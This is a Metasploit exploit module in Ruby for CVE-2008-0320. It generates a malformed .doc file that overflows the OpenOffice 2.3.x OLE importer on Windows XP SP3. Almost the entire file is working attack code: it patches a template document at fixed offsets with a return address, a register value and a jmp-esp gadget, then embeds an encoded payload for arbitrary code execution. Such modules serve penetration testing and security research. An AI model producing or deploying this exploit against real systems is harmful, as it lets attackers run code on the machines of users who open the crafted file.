##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info={})
		super(update_info(info,
			'Name'           => "OpenOffice OLE Importer DocumentSummaryInformation Stream Handling Overflow",
			'Description'    => %q{
					This module exploits a vulnerability in OpenOffice 2.3.1 and 2.3.0 on
				Microsoft Windows XP SP3.

				By supplying a OLE file with a malformed DocumentSummaryInformation stream, an
				attacker can gain control of the execution flow, which results arbitrary code
				execution under the context of the user.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Marsu <Marsupilamipowa[at]hotmail.fr>', # Vulnerability discovery and PoC
					'juan vazquez'  # Metasploit module
				],
			'References'     =>
				[
					['CVE', '2008-0320'],
					['OSVDB', '44472'],
					['BID', '28819'],
					['EDB', '5584'],
					['URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=694']
				],
			'Payload'        =>
				{
					'Space' => 407
				},
			'DefaultOptions'  =>
				{
					'EXITFUNC'          => 'process',
					'DisablePayloadHandler' => 'true'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'OpenOffice 2.3.1 / 2.3.0 on Windows XP SP3',
						{
							'Ret' => 0x609345fe, # add esp, ebx # ... # ret from tl680mi
							'EBX' => 0xffffefa8, # EBX value
							'JmpEsp' => 0x60915cbd, # push esp # ret from tl680mi
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Apr 17 2008",
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [true, 'The filename', 'msf.doc'])
				], self.class)
	end

	def exploit

		path = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2008-0320.doc')
		f = File.open(path, 'rb')
		template = f.read
		f.close

		my_payload = payload.encoded
		template[115717, 4] = [target['Ret']].pack("V")
		template[115725, 4] = [target['EBX']].pack("V")
		template[115729, 4] = [target['JmpEsp']].pack("V")
		template[115808, my_payload.length] = my_payload
		file_create(template)

	end

end